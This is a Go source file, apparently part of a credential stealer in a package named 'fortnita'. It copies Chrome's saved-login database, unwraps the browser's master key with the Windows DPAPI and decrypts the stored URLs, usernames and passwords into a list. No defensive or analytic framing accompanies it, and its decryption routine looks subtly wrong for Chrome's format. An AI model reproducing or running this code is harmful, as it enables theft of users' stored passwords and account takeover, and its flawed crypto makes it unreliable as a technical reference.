package fortnita

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/nacl/secretbox"
)

var Passw []string
var PasswCount int
var temp string = os.TempDir()

func CryptUnprotectData(data []byte) ([]byte, error) {
	crypt32 := syscall.NewLazyDLL("Crypt32.dll")
	kernel32 := syscall.NewLazyDLL("Kernel32.dll")
	procCryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
	procLocalFree := kernel32.NewProc("LocalFree")

	type DATA_BLOB struct {
		cbData uint32
		pbData *byte
	}

	var outBlob DATA_BLOB
	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&DATA_BLOB{uint32(len(data)), (*byte)(unsafe.Pointer(&data[0]))})),
		0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	result := make([]byte, outBlob.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:])
	return result, nil
}

func GetPassw() []string {
	path := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
	if _, err := os.Stat(path); os.IsNotExist(err) {
		panic(err)
	}

	pathC := filepath.Join(path, "Login Data")
	if info, err := os.Stat(pathC); err != nil || info.Size() == 0 {
		panic(err)
	}

	tempfold := filepath.Join(temp, "wp"+randomString(8)+".db")
	if err := copyFile(pathC, tempfold); err != nil {
		panic(err)
	}
	defer os.Remove(tempfold)

	conn, err := sql.Open("sqlite3", tempfold)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	rows, err := conn.Query("SELECT action_url, username_value, password_value FROM logins")
	if err != nil {
		panic(err)
	}
	defer rows.Close()

	var data []map[string]string
	for rows.Next() {
		var actionURL, username, password string
		if err := rows.Scan(&actionURL, &username, &password); err == nil {
			data = append(data, map[string]string{
				"action_url":     actionURL,
				"username_value": username,
				"password_value": password,
			})
		}
	}

	pathKey := filepath.Join(path, "Local State")
	localState, err := ioutil.ReadFile(pathKey)
	if err != nil {
		panic(err)
	}

	var localStateJSON map[string]interface{}
	if err := json.Unmarshal(localState, &localStateJSON); err != nil {
		panic(err)
	}

	masterKeyEnc := localStateJSON["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	masterKey, _ := base64.StdEncoding.DecodeString(masterKeyEnc)
	masterKey, err = CryptUnprotectData(masterKey[5:])
	if err != nil {
		panic(err)
	}

	for _, row := range data {
		if row["action_url"] != "" {
			password, err := base64.StdEncoding.DecodeString(row["password_value"])
			if err != nil {
				continue
			}
			Passw = append(Passw, fmt.Sprintf("URL: %s | Username: %s | Password: %s",
				row["action_url"], row["username_value"], decryptValue(password, masterKey)))
			PasswCount++
		}
	}
	return Passw
}

func randomString(n int) string {
	const letters = "bcdefghijklmnopqrstuvwxyz"
	rand.Seed(time.Now().UnixNano())
	s := make([]byte, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func decryptValue(data, key []byte) string {
	var nonce [24]byte
	copy(nonce[:], data[:24])
	ciphertext := data[24:]
	var out []byte
	out, ok := secretbox.Open(out, ciphertext, &nonce, (*[32]byte)(key))
	if !ok {
		return ""
	}
	return string(out)
}
